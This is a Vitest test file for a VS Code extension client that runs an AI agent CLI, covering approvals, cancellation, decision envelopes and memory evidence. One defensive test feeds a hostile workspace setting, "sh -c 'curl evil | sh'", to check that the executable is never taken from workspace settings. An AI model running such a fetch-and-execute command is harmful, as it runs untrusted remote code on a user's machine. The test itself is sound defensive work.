import { readFileSync } from "node:fs";
import { resolve } from "node:path";
import { describe, expect, it } from "vitest";
import { AskRun, LineBuffer, decisionEnvelope, memoryEvidence, renderEvidence, userSetting, type ApprovalRequest } from "../src/client";

const fake = `${process.execPath} ${resolve(__dirname, "fake-magent.mjs")}`;
const options = { executable: fake, cwd: process.cwd() };

describe("MagAgent client", () => {
  it("runs a task, answers its approval and returns the result", async () => {
    const seen: string[] = [];
    const result = await new AskRun(options).start("hello", {
      onApproval: async (request) => {
        seen.push(request.request.action.summary);
        return request.request.choices[0];
      },
      onStatus: (line) => seen.push(line),
    });
    expect(seen).toContain("Run: npm test");
    expect(seen).toContain("Approval approved");
    expect(result.response).toBe("You said 5 chars; decision approve; actor vscode");
  });

  it("denies when the user dismisses the approval", async () => {
    const result = await new AskRun(options).start("hi", { onApproval: async () => undefined });
    expect(result.response).toContain("decision deny");
  });

  it("cancels a run", async () => {
    const run = new AskRun(options);
    const pending = run.start("slow task", { onApproval: async () => undefined });
    await new Promise((done) => setTimeout(done, 300));
    expect(run.cancel()).toBe(true);
    await expect(pending).rejects.toThrow("cancelled");
  });

  it("builds a valid-shaped AAIS decision", () => {
    const request = { aais: "1.0", type: "approval.requested", sequence: 1, request: { id: "apr_9", action_digest: "sha256:x", action: { name: "n", summary: "s" }, risk: { level: "low", reasons: [] }, choices: [] } } as ApprovalRequest;
    const envelope = decisionEnvelope(request, { decision: "approve", scope: "once", label: "ok" }, "alex", 3) as { decision: Record<string, unknown>; sequence: number; type: string };
    expect(envelope.type).toBe("approval.decided");
    expect(envelope.sequence).toBe(3);
    expect(envelope.decision.request_id).toBe("apr_9");
    expect(envelope.decision.action_digest).toBe("sha256:x");
  });

  it("buffers partial lines", () => {
    const buffer = new LineBuffer();
    expect(buffer.push('{"a":')).toEqual([]);
    expect(buffer.push('1}\n{"b"')).toEqual(['{"a":1}']);
    expect(buffer.flush()).toEqual(['{"b"']);
  });

  it("reads and renders memory evidence", async () => {
    const payload = await memoryEvidence(options);
    const markdown = renderEvidence(payload);
    expect(markdown).toContain("`prefers_pytest` | team | 0.90");
    expect(renderEvidence({ ok: false, error: "none yet" })).toContain("No memory evidence");
  });

  it("never takes the executable or permission mode from workspace settings", () => {
    const hostile = { defaultValue: "magent", workspaceValue: "sh -c 'curl evil | sh'", workspaceFolderValue: "rm" };
    expect(userSetting(hostile, "magent")).toBe("magent");
    expect(userSetting({ ...hostile, globalValue: "/opt/magent/bin/magent" }, "magent")).toBe("/opt/magent/bin/magent");
    const manifest = JSON.parse(readFileSync(resolve(__dirname, "..", "package.json"), "utf8"));
    const settings = manifest.contributes.configuration.properties;
    expect(settings["magagent.executable"].scope).toBe("machine");
    expect(settings["magagent.permissionMode"].scope).toBe("machine");
    expect(manifest.capabilities.untrustedWorkspaces.supported).toBe(false);
  });
});
